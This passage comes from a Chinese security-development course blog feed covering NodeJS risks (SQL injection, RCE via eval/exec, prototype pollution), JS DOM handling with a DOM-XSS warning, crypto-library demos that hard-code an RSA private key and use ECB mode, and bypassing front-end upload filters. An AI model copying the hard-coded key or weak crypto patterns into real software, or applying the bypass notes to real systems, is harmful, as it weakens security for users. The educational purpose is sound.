</p></li><li><p>multer<br>node.js中间件，用于处理 enctype&#x3D;”multipart&#x2F;form-data”（设置表单的MIME编码）的表单数据。  </p></li><li><p>mysql<br>Node.js来连接MySQL专用库，并对数据库进行操作。</p></li></ul><p>安装命令：  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">npm i express</span><br><span class="line">npm i body-parser</span><br><span class="line">npm i cookie-parser</span><br><span class="line">npm i multer</span><br><span class="line">npm i mysql</span><br></pre></td></tr></table></figure><h2 id="功能实现-NodeJS-数据库-文件-执行"><a href="#功能实现-NodeJS-数据库-文件-执行" class="headerlink" title="功能实现-NodeJS-数据库&amp;文件&amp;执行"></a>功能实现-NodeJS-数据库&amp;文件&amp;执行</h2><ul><li><p>an<br>1、Express开发<br>2、实现用户登录<br>3、加入数据库操作  </p></li><li><p>文件操作<br>1、Express开发<br>2、实现目录读取<br>3、加入传参接受  </p></li><li><p>命令执行（RCE）<br>1、eval<br>2、exec &amp; spawnSync</p></li></ul><h2 id="安全问题-NodeJS-注入-RCE-原型链"><a href="#安全问题-NodeJS-注入-RCE-原型链" class="headerlink" title="安全问题-NodeJS-注入&amp;RCE&amp;原型链"></a>安全问题-NodeJS-注入&amp;RCE&amp;原型链</h2><ul><li>1、SQL注入&amp;文件操作</li><li>2、RCE执行&amp;原型链污染</li><li>3、NodeJS黑盒无代码分析<br>实战测试NodeJS安全：<br>判断：参考前期的信息收集<br>黑盒：通过对各种功能和参数进行payload测试<br>白盒：通过对代码中写法安全进行审计分析  </li><li>4、原型链污染<br>如果攻击者控制并修改了一个对象的原型，(<strong>proto</strong>)<br>那么将可以影响所有和这个对象来自同一个类、父祖类的对象。</li></ul><h2 id="案例分析-NodeJS-CTF题目-源码审计"><a href="#案例分析-NodeJS-CTF题目-源码审计" class="headerlink" title="案例分析-NodeJS-CTF题目&amp;源码审计"></a>案例分析-NodeJS-CTF题目&amp;源码审计</h2><ul><li>1、CTFSHOW几个题目<br><a href="https://ctf.show/">https://ctf.show/</a> Web334-344<br><a href="https://f1veseven.github.io/2022/04/03/ctf-nodejs-zhi-yi-xie-xiao-zhi-shi/">https://f1veseven.github.io/2022/04/03/ctf-nodejs-zhi-yi-xie-xiao-zhi-shi/</a>  </li><li>2、YApi管理平台漏洞<br><a href="https://blog.csdn.net/weixin_42353842/article/details/127960229">https://blog.csdn.net/weixin_42353842/article/details/127960229</a></li></ul><h2 id="开发指南-NodeJS-安全SecGuide项目"><a href="#开发指南-NodeJS-安全SecGuide项目" class="headerlink" title="开发指南-NodeJS-安全SecGuide项目"></a>开发指南-NodeJS-安全SecGuide项目</h2><p><a href="https://github.com/Tencent/secguide">https://github.com/Tencent/secguide</a>  </p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>29安全开发-JS技术</title>
      <link href="/2023/10/10/29%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JS%E6%8A%80%E6%9C%AF/"/>
      <url>/2023/10/10/29%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JS%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/07/22%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-php%E5%BA%94%E7%94%A8/">22安全开发</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>20、JS技术-DOM树操作及安全隐患</li><li>21、JS技术-加密编码及数据安全调试</li></ul><h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><ul><li>1、PHP：<br>功能：新闻列表，会员中心，资源下载，留言版，后台模块，模版引用，框架开发等<br>技术：输入输出，超全局变量，数据库操作，逻辑架构，包含上传&amp;下载删除;<br>技术：JS&amp;CSS混用，Cookie,Session操作，MVC架构，ThinkPHP引用等。<br>安全：原生PHP开发安全，模版引用安全，第三方插件安全，TP框架安全等  </li><li>2、JS：<br>功能：登录验证，文件操作，SQL操作，云应用接入，框架开发，打包器使用等<br>技术：原生开发，DOM，常见库使用，框架开发（Vue，NodeJS），打包器(Webpack)等<br>安全：原生开发安全，NodeJS安全，Vue安全，打包器Webpack安全，三方库安全问题等  </li><li>3、Java：<br>内容筹备中……</li></ul><h2 id="JS原生开发-DOM树-用户交互"><a href="#JS原生开发-DOM树-用户交互" class="headerlink" title="JS原生开发-DOM树-用户交互"></a>JS原生开发-DOM树-用户交互</h2><p>DOM：文档操作对象<br>浏览器提供的一套专门用来操作网页代码内容的功能，实现自主或用户交互动作反馈  </p><p>安全问题：本身的前端代码通过DOM技术实现代码的更新修改，但是更新修改如果修改的数据可以由用户来指定，就会造成DOM-XSS攻击！  </p><ul><li><p>1、获取对象<br>标签：直接写<br>Class：加上符号.<br>id：加上符号#  </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">&quot;myHeader&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;getValue()&quot;</span>&gt;</span>这是标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">document.querySelector(&#x27;h1&#x27;)</span><br><span class="line">document.querySelector(&#x27;.id&#x27;)</span><br><span class="line">document.querySelector(&#x27;#myHeader&#x27;)</span><br></pre></td></tr></table></figure></li><li><p>2、获取对象属性  </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">&quot;myHeader&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;getValue()&quot;</span>&gt;</span>这是标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">const h1=document.querySelector(&#x27;h1&#x27;)</span><br><span class="line">const id=h1.id</span><br><span class="line">console.log(id)</span><br></pre></td></tr></table></figure></li><li><p>3、操作元素数据<br>innerHTML 解析后续代码<br>innerText 不解析后续代码  </p></li><li><p>4、操作元素属性  </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">className src id等  </span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;iphone.jpg&quot;</span> <span class="attr">width</span>=<span class="string">&quot;300&quot;</span> <span class="attr">height</span>=<span class="string">&quot;300&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span><br><span class="line">const src=document.querySelector(&#x27;img&#x27;)</span><br><span class="line">src.src=&#x27;huawei.png&#x27;</span><br></pre></td></tr></table></figure></li></ul><h2 id="JS导入库开发-编码加密-逆向调试"><a href="#JS导入库开发-编码加密-逆向调试" class="headerlink" title="JS导入库开发-编码加密-逆向调试"></a>JS导入库开发-编码加密-逆向调试</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Base64</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//MD5</span></span><br><span class="line">&lt;script src=<span class="string">&quot;js/md5.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> str1 = <span class="string">&#x27;xiaodisec&#x27;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> str_encode = <span class="title function_">md5</span>(str1);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">console</span>.<span class="title function_">log</span>(str_encode) </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//SHA1</span></span><br><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/crypto-js.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> str1 = <span class="string">&#x27;xiaodisec&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> str_encode = <span class="title class_">CryptoJS</span>.<span class="title class_">SHA1</span>(str1).<span class="title function_">toString</span>(); <span class="comment">// 注意：1是数字1</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="variable language_">console</span>.<span class="title function_">log</span>(str_encode)  </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;/html&gt;      </span><br><span class="line"></span><br><span class="line"><span class="comment">//HMAC</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/crypto-js.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> key = <span class="string">&#x27;key&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> str1 = <span class="string">&#x27;xiaodisec&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> hash = <span class="title class_">CryptoJS</span>.<span class="title class_">HmacSHA256</span>(key, str1);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> str_encode = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Hex</span>.<span class="title function_">stringify</span>(hash);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">console</span>.<span class="title function_">log</span>(str_encode)  <span class="comment">// &#x27;11a7960cd583ee2c3f1ed910dbc3b6c3991207cbc527d122f69e84d13cc5ce5c&#x27;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//AES</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/crypto-js.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="keyword">var</span> aseKey = <span class="string">&quot;12345678&quot;</span>     <span class="comment">// 定制秘钥，长度必须为：8/16/32位, 长度不一致也没问题</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="keyword">var</span> message = <span class="string">&quot;xiaodisec&quot;</span>;  <span class="comment">// 需要加密的内容</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="comment">// 加密 DES/AES切换只需要修改 CryptoJS.AES &lt;=&gt; CryptoJS.DES</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="keyword">var</span> encrypt = <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">encrypt</span>(message, <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(aseKey),  <span class="comment">// 参数1=密钥, 参数2=加密内容</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">              &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="attr">mode</span>: <span class="title class_">CryptoJS</span>.<span class="property">mode</span>.<span class="property">ECB</span>, <span class="comment">// 为DES的工作方式</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="attr">padding</span>: <span class="title class_">CryptoJS</span>.<span class="property">pad</span>.<span class="property">Pkcs7</span>  <span class="comment">// 当加密后密文长度达不到指定整数倍(8个字节、16个字节)则填充对应字符</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">             &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          ).<span class="title function_">toString</span>(); <span class="comment">// toString=转字符串类型</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="variable language_">console</span>.<span class="title function_">log</span>(encrypt); <span class="comment">// 在弹窗中打印字符串 2vcsEDJv9vAZZLgFLjkZ9A==</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="comment">//解密</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="keyword">var</span> decrypt = <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">decrypt</span>(encrypt, <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(aseKey), <span class="comment">// 参数1=密钥, 参数2=解密内容</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">              &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="attr">mode</span>: <span class="title class_">CryptoJS</span>.<span class="property">mode</span>.<span class="property">ECB</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="attr">padding</span>: <span class="title class_">CryptoJS</span>.<span class="property">pad</span>.<span class="property">Pkcs7</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">              &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          ).<span class="title function_">toString</span>(<span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>); <span class="comment">// toString=转字符串类型,并指定编码</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="variable language_">console</span>.<span class="title function_">log</span>(decrypt); <span class="comment">// &quot;xiaodisec&quot;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//DES</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/crypto-js.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">var</span> aseKey = <span class="string">&quot;12345678&quot;</span>     <span class="comment">// 定制秘钥，长度必须为：8/16/32位， 长度不一致也没问题</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">var</span> message = <span class="string">&quot;xiaodisec&quot;</span>;  <span class="comment">// 需要加密的内容</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="comment">// 加密 DES/AES切换只需要修改 CryptoJS.AES &lt;=&gt; CryptoJS.DES</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">var</span> encrypt = <span class="title class_">CryptoJS</span>.<span class="property">DES</span>.<span class="title function_">encrypt</span>(message, <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(aseKey),  <span class="comment">// 参数1=密钥, 参数2=加密内容</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="attr">mode</span>: <span class="title class_">CryptoJS</span>.<span class="property">mode</span>.<span class="property">ECB</span>, <span class="comment">// 为DES的工作方式</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="attr">padding</span>: <span class="title class_">CryptoJS</span>.<span class="property">pad</span>.<span class="property">Pkcs7</span>  <span class="comment">// 当加密后密文长度达不到指定整数倍(8个字节、16个字节)则填充对应字符</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">         &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      ).<span class="title function_">toString</span>(); <span class="comment">// toString=转字符串类型</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="variable language_">console</span>.<span class="title function_">log</span>(encrypt); <span class="comment">// 控制台打印 CDVNwmEwDRM</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="comment">//解密</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">var</span> decrypt = <span class="title class_">CryptoJS</span>.<span class="property">DES</span>.<span class="title function_">decrypt</span>(encrypt, <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(aseKey), <span class="comment">// 参数1=密钥, 参数2=解密内容</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="attr">mode</span>: <span class="title class_">CryptoJS</span>.<span class="property">mode</span>.<span class="property">ECB</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="attr">padding</span>: <span class="title class_">CryptoJS</span>.<span class="property">pad</span>.<span class="property">Pkcs7</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      ).<span class="title function_">toString</span>(<span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>); <span class="comment">// toString=转字符串类型,并指定编码</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="variable language_">console</span>.<span class="title function_">log</span>(decrypt); <span class="comment">// 控制台打印 &quot;i am xiaozhou ?&quot;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//RSA</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/jsencrypt.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="comment">// 公钥 私匙是通过公匙计算生成的，不能盲目设置</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> <span class="variable constant_">PUBLIC_KEY</span> = <span class="string">&#x27;-----BEGIN PUBLIC KEY-----MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBALyBJ6kZ/VFJYTV3vOC07jqWIqgyvHulv6us/8wzlSBqQ2+eOTX7s5zKfXY40yZWDoCaIGk+tP/sc0D6dQzjaxECAwEAAQ==-----END PUBLIC KEY-----&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="comment">//私钥</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> <span class="variable constant_">PRIVATE_KEY</span> = <span class="string">&#x27;-----BEGIN PRIVATE KEY-----MIIBVQIBADANBgkqhkiG9w0BAQEFAASCAT8wggE7AgEAAkEAvIEnqRn9UUlhNXe84LTuOpYiqDK8e6W/q6z/zDOVIGpDb545NfuznMp9djjTJlYOgJogaT60/+xzQPp1DONrEQIDAQABAkEAu7DFsqQEDDnKJpiwYfUE9ySiIWNTNLJWZDN/Bu2dYIV4DO2A5aHZfMe48rga5BkoWq2LALlY3tqsOFTe3M6yoQIhAOSfSAU3H6jIOnlEiZabUrVGqiFLCb5Ut3Jz9NN+5p59AiEA0xQDMrxWBBJ9BYq6RRY4pXwa/MthX/8Hy+3GnvNw/yUCIG/3Ee578KVYakq5pih8KSVeVjO37C2qj60d3Ok3XPqBAiEAqGPvxTsAuBDz0kcBIPqASGzArumljkrLsoHHkakOfU0CIDuhxKQwHlXFDO79ppYAPcVO3bph672qGD84YUaHF+pQ-----END PRIVATE KEY-----&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="comment">//使用公钥加密</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> encrypt = <span class="keyword">new</span> <span class="title class_">JSEncrypt</span>();<span class="comment">//实例化加密对象</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        encrypt.<span class="title function_">setPublicKey</span>(<span class="variable constant_">PUBLIC_KEY</span>);<span class="comment">//设置公钥</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> message = <span class="string">&#x27;xiaodisec&#x27;</span> <span class="comment">// 需要加密的数据 </span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> encrypted = encrypt.<span class="title function_">encrypt</span>(message);<span class="comment">//对指定数据进行加密</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="variable language_">console</span>.<span class="title function_">log</span>(encrypted)  <span class="comment">// &#x27;JQ83h8tmJpsSZcb4BJ3eQvuqIAs3ejepcUUnoFhQEvum8fA8bf1Y/fG+DO1bSIVNJF6EOZKe4wa0njv6aOar9w==&#x27;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="comment">//使用私钥解密</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> decrypt = <span class="keyword">new</span> <span class="title class_">JSEncrypt</span>(); <span class="comment">// 创建解密对象</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        decrypt.<span class="title function_">setPrivateKey</span>(<span class="variable constant_">PRIVATE_KEY</span>); <span class="comment">//设置私钥</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> uncrypted = decrypt.<span class="title function_">decrypt</span>(encrypted); <span class="comment">//解密 &#x27;xiaodisec&#x27;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="variable language_">console</span>.<span class="title function_">log</span>(uncrypted);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>28安全开发-JS应用</title>
      <link href="/2023/10/10/28%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JS%E5%BA%94%E7%94%A8/"/>
      <url>/2023/10/10/28%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JS%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/07/22%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-php%E5%BA%94%E7%94%A8/">22安全开发</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>18、JS应用-原生态开发&amp;第三库开发</li><li>19、JS功能-文件上传&amp;登录验证&amp;商品购买</li></ul><h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><ul><li>1、PHP：<br>功能：新闻列表，会员中心，资源下载，留言版，后台模块，模版引用，框架开发等<br>技术：输入输出，超全局变量，数据库操作，逻辑架构，包含上传&amp;下载删除;<br>技术：JS&amp;CSS混用，Cookie,Session操作，MVC架构，ThinkPHP引用等。  </li><li>2、JS：<br>功能：登录验证，文件操作，商品购买，数据库操作，云应用接入，框架开发等<br>技术：原生开发，DOM树，常见库使用(JQuery)，框架开发（Vue，Nodejs）等  </li><li>3、Java：<br>内容筹备中……</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>1、原生JS教程<br><a href="https://www.w3school.com.cn/js/index.asp">https://www.w3school.com.cn/js/index.asp</a>  </li><li>2、jQuery库教程<br><a href="https://www.w3school.com.cn/jquery/index.asp">https://www.w3school.com.cn/jquery/index.asp</a></li></ul><h2 id="JS原生开发-文件上传-变量-对象-函数-事件"><a href="#JS原生开发-文件上传-变量-对象-函数-事件" class="headerlink" title="JS原生开发-文件上传-变量&amp;对象&amp;函数&amp;事件"></a>JS原生开发-文件上传-变量&amp;对象&amp;函数&amp;事件</h2><ul><li>1、布置前端页面  </li><li>2、JS获取提交数据  </li><li>3、JS对上传格式判断  </li><li>4、后端对上传数据处理<br>前端JS进行后缀过滤，后端PHP进行上传处理<br>架构：html js php - upload.php</li></ul><h3 id="安全问题："><a href="#安全问题：" class="headerlink" title="安全问题："></a>安全问题：</h3><ul><li>1、过滤代码能看到分析绕过   </li><li>2、禁用JS或删除过滤代码绕过</li></ul><h2 id="JS导入库开发-登录验证-JQuery库-Ajax技术"><a href="#JS导入库开发-登录验证-JQuery库-Ajax技术" class="headerlink" title="JS导入库开发-登录验证-JQuery库&amp;Ajax技术"></a>JS导入库开发-登录验证-JQuery库&amp;Ajax技术</h2><ul><li>1、布置前端页面  </li><li>2、获取登录事件  </li><li>3、配置Ajax请求  </li><li>4、后端代码验证  </li><li>5、成功回调判断<br>后端PHP进行帐号判断，前端JS进行登录处理<br>架构：html js login.html - logincheck.php</li></ul><h2 id="JS导入库开发-逻辑购买-JQuery库-Ajax技术"><a href="#JS导入库开发-逻辑购买-JQuery库-Ajax技术" class="headerlink" title="JS导入库开发-逻辑购买-JQuery库&amp;Ajax技术"></a>JS导入库开发-逻辑购买-JQuery库&amp;Ajax技术</h2><ul><li>1、布置前端页面  </li><li>2、获取登录事件  </li><li>3、配置Ajax请求  </li><li>4、后端代码验证  </li><li>5、成功回调判断<br>架构：html js shop.html - shopcheck.php</li></ul><h2 id="实例测试-某违规APP-密码找回-JS验证逻辑安全"><a href="#实例测试-某违规APP-密码找回-JS验证逻辑安全" class="headerlink" 